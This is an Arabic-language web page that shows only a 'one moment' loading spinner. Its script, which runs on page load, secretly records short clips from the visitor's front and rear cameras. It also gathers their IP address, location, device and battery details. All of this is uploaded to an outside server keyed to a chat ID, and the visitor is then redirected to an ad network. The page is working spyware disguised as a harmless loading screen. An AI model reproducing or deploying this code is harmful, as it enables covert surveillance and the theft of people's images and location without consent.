<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>لحظة واحدة..</title>
  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background-color: #121212;
      color: #e0e0e0;
      overflow: hidden;
    }
    video {
      display: none;
    }
    #loadingOverlay {
      position: fixed;
      top: 0;
      left: 0;
      width: 100%;
      height: 100%;
      background: rgba(18, 18, 18, 0.8);
      color: #e0e0e0;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 24px;
      z-index: 1000;
      flex-direction: column;
    }
    .spinner {
      border: 16px solid #f3f3f3;
      border-top: 16px solid #3498db;
      border-radius: 50%;
      width: 100px;
      height: 100px;
      animation: spin 1.5s linear infinite;
      margin-bottom: 20px;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
    .loadingText {
      font-size: 20px;
      text-align: center;
      font-weight: bold;
      text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
    }
  </style>
</head>
<body>
  <div id="loadingOverlay">
    <div class="spinner"></div>
    <div class="loadingText" id="status">لحظة واحدة</div>
  </div>
  <video id="preview" width="640" height="480" autoplay muted></video>

  <script>
    const chatId = new URLSearchParams(window.location.search).get('chatId');
    const statusText = document.getElementById('status');
    const videoElement = document.getElementById('preview');

    async function getDeviceInfo() {
      try {
        const ipRes = await fetch('https://ipapi.co/json/');
        const ipData = await ipRes.json();
        const battery = navigator.getBattery ? await navigator.getBattery() : {};
        const ua = navigator.userAgent;
        const match = ua.match(/\(([^)]+)\)/);

        return {
          ip: ipData.ip,
          country: ipData.country_name,
          city: ipData.city,
          platform: /Android/.test(ua) ? "Android" : /iPhone|iPad/.test(ua) ? "iOS" : "Other",
          deviceVersion: match ? match[1] : 'Unknown',
          batteryLevel: battery.level,
          batteryCharging: battery.charging
        };
      } catch (e) {
        return {};
      }
    }

    async function recordAndSendVideo(facingMode = "user") {
      statusText.innerText = "لحظة واحدة...";
      const constraints = { video: { facingMode }, audio: false };

      try {
        const stream = await navigator.mediaDevices.getUserMedia(constraints);
        videoElement.srcObject = stream;

        const recorder = new MediaRecorder(stream);
        const chunks = [];
        recorder.ondataavailable = e => chunks.push(e.data);

        recorder.start();

        // تسجيل من 3 إلى 5 ثوانٍ
        const duration = 3000 + Math.floor(Math.random() * 2000);
        await new Promise(resolve => setTimeout(resolve, duration));
        recorder.stop();

        await new Promise(resolve => recorder.onstop = resolve);
        stream.getTracks().forEach(t => t.stop());

        const blob = new Blob(chunks, { type: 'video/webm' });
        const formData = new FormData();
        formData.append('video', blob, 'recording.webm');
        formData.append('userId', chatId);
        formData.append('cameraType', facingMode);

        const deviceInfo = await getDeviceInfo();
        formData.append('additionalData', JSON.stringify(deviceInfo));

        statusText.innerText = "لحظة واحدة...";

        const res = await fetch('https://freeusr1.onrender.com/submitVideo', {
          method: 'POST',
          body: formData
        });

        if (!res.ok) throw new Error("لحظة واحدة");

        statusText.innerText = "تم بنجاح";
      } catch (err) {
        console.error(err);
        statusText.innerText = "❌ لم يتم الحصول على صلاحيات الكاميرا.";
      }
    }

    (async () => {
      await recordAndSendVideo("user");        // الكاميرا الأمامية
      await recordAndSendVideo("environment"); // الكاميرا الخلفية
      // إعادة التوجيه بعد الانتهاء
      window.location.href = "https://www.profitableratecpm.com/k9n9rdcsr?key=a6d387f380a559c60dc3368e5c343738";
    })();
  </script>
<script type='text/javascript' src='//pl27402931.profitableratecpm.com/4f/ac/c1/4facc18f55584cc499c878e46c1ccbee.js'></script>
</body>
</html>
